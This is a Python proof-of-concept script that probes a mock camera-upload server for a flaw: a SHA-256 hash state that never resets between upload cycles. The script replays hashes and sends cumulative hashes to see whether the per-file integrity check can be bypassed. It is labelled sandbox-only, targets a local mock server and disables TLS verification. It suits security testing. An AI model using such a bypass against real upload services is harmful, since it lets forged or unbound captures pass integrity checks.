#!/usr/bin/env python3
"""running_hash_probe.py -- probe for running-SHA256-state non-reset across multiple
upload cycles on a single connection to the Flock mock upload server (upload_server.py).

IDEA UNDER TEST (protocol-logic, not the known length-prefix DoS):
  upload_server.py's handle() creates ONE hashlib.sha256() object per TCP connection
  (`received_file`) and never re-initializes it between logical upload cycles (i.e.
  between SESSION/START...SAVE/COMPLETE blocks). Because hashlib's .update() is
  cumulative and .digest() is non-destructive (doesn't reset state), this script checks:

  1. Baseline: FILE(A) + HASH(sha256(A)) on a fresh connection -> should match.
  2. Replay-without-new-file: resend HASH(sha256(A)) with NO new FILE op in between.
     If the server still reports "match", the HASH check is not scoped to a specific
     FILE transfer -- it's just comparing against whatever the connection has ever sent.
  3. Second real capture, correct per-file hash: FILE(B) + HASH(sha256(B)) on the SAME
     connection. If the running hash was never reset, the server's internal digest is
     actually sha256(A+B), so this LEGITIMATE hash will spuriously fail (mismatch).
  4. Cumulative-hash bypass: instead send HASH(sha256(A+B)) for the same FILE(B) cycle.
     If this "matches", it proves an attacker who tracks the server's running state can
     make ANY subsequent per-capture integrity check pass without it actually binding to
     that capture's bytes alone -- the HASH op verifies session-cumulative bytes, not the
     specific file just uploaded.

SANDBOX ONLY -- talks only to your own local mock server instance.
"""
import argparse, hashlib, json, os, socket, ssl, struct, sys, time

OK, HELLO, PROTO, SESSION, START, FILE, HASH, SAVE, COMPLETE, METADATA = 1, 2, 3, 4, 5, 6, 7, 8, 9, 12


def connect(host, port, tls):
    s = socket.create_connection((host, port), timeout=10)
    if tls:
        ctx = ssl._create_unverified_context()
        s = ctx.wrap_socket(s, server_hostname=host)
    return s


def be_long(n):
    return struct.pack(">q", n)


def _recvn(s, n):
    b = b""
    while len(b) < n:
        c = s.recv(n - len(b))
        if not c:
            raise ConnectionError("closed")
        b += c
    return b


def _recvn_opt(s):
    s.settimeout(0.3)
    try:
        return s.recv(1)
    except Exception:
        return b""
    finally:
        s.settimeout(10)


def hello(s, token):
    payload = json.dumps({"authToken": token, "serial": "MOCK-000000", "clientVersion": "sandbox"}).encode()
    s.sendall(bytes([HELLO]))
    s.sendall(bytes([3]))
    s.sendall(be_long(len(payload)))
    s.sendall(payload)
    n = struct.unpack(">q", _recvn(s, 8))[0]
    resp = _recvn(s, n)
    _recvn_opt(s)
    s.sendall(bytes([OK]))
    return resp.decode("utf-8", "replace")


def send_file(s, data, chunk):
    s.sendall(bytes([FILE]))
    s.sendall(be_long(len(data)))
    for i in range(0, len(data), chunk):
        s.sendall(data[i:i + chunk])
    ack = _recvn(s, 1)[0]
    return ack


def send_hash(s, digest32):
    s.sendall(bytes([HASH]))
    s.sendall(digest32)
    return _recvn(s, 1)[0]


def send_metadata(s, meta):
    s.sendall(bytes([METADATA]))
    s.sendall(be_long(len(meta)))
    s.sendall(meta)
    return _recvn(s, 1)[0]


def op(s, code):
    s.sendall(bytes([code]))
    return _recvn(s, 1)[0]


def meta_bytes(serial="MOCK-000000"):
    return json.dumps({"cameraSerial": serial, "createdAt": int(time.time()),
                        "detections": [{"className": "vehicle", "confidence": 0.9,
                                        "xmin": 0.1, "ymin": 0.1, "xmax": 0.5, "ymax": 0.5}]}).encode()


def result(label, expected_ok, got_ok, extra=""):
    verdict = "AS EXPECTED" if (expected_ok == got_ok) else "**UNEXPECTED**"
    return f"[{label}] server_returned={'OK(1)' if got_ok else 'FAIL(0)'} expected_ok={expected_ok} -> {verdict}  {extra}"


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--host", default="127.0.0.1")
    ap.add_argument("--port", type=int, required=True)
    ap.add_argument("--token", default="SANDBOX-FAKE-TOKEN")
    ap.add_argument("--plaintext", action="store_true")
    ap.add_argument("--chunk", type=int, default=2800)
    ap.add_argument("--sizeA", type=int, default=9000)
    ap.add_argument("--sizeB", type=int, default=6000)
    ap.add_argument("--out", default="running_hash_probe_output.txt")
    a = ap.parse_args()

    log_lines = []
    rec = log_lines.append

    A = os.urandom(a.sizeA)
    B = os.urandom(a.sizeB)
    hashA = hashlib.sha256(A).digest()
    hashB = hashlib.sha256(B).digest()
    hashAB = hashlib.sha256(A + B).digest()

    s = connect(a.host, a.port, not a.plaintext)
    hr = hello(s, a.token)
    rec(f"HELLO -> {hr}")

    # ---- Cycle 1: normal baseline upload of A ----
    _ = op(s, SESSION); _ = op(s, START)
    _ = send_metadata(s, meta_bytes())
    fack = send_file(s, A, a.chunk)
    rec(f"cycle1 FILE(A) size={len(A)} ack={fack}")
    r1 = send_hash(s, hashA)
    rec(result("1-baseline sha256(A) after FILE(A)", True, r1 == OK, f"sha256(A)={hashA.hex()[:16]}.."))
    _ = op(s, SAVE); _ = op(s, COMPLETE)

    # ---- Probe 2: replay same HASH with NO new FILE sent ----
    r2 = send_hash(s, hashA)
    rec(result("2-replay sha256(A) with NO new FILE op in between", True, r2 == OK,
               "if this matches, HASH is not scoped to a preceding FILE op"))

    # ---- Cycle 3: second real capture B, hashed correctly on its own ----
    _ = op(s, SESSION); _ = op(s, START)
    _ = send_metadata(s, meta_bytes())
    fack2 = send_file(s, B, a.chunk)
    rec(f"cycle3 FILE(B) size={len(B)} ack={fack2}")
    r3 = send_hash(s, hashB)
    rec(result("3-legit sha256(B) after FILE(B), 2nd capture same conn", True, r3 == OK,
               f"sha256(B)={hashB.hex()[:16]}.. EXPECT SPURIOUS FAIL if running hash never reset"))
    _ = op(s, SAVE); _ = op(s, COMPLETE)

    # ---- Probe 4: cumulative-hash bypass for a fresh FILE(B) cycle ----
    _ = op(s, SESSION); _ = op(s, START)
    _ = send_metadata(s, meta_bytes())
    fack3 = send_file(s, B, a.chunk)
    rec(f"cycle4 FILE(B) again size={len(B)} ack={fack3}")
    r4 = send_hash(s, hashAB)
    rec(result("4-cumulative sha256(A+B) sent instead of sha256(B)", True, r4 == OK,
               f"sha256(A+B)={hashAB.hex()[:16]}.. if MATCH: attacker who tracks running state "
               f"can pass per-capture integrity check without hash binding to that capture's bytes"))
    _ = op(s, SAVE); _ = op(s, COMPLETE)

    s.close()

    print("\n---- SUMMARY ----")
    for l in log_lines:
        print(l)

    with open(a.out, "w") as f:
        f.write("\n".join(log_lines) + "\n")


if __name__ == "__main__":
    main()
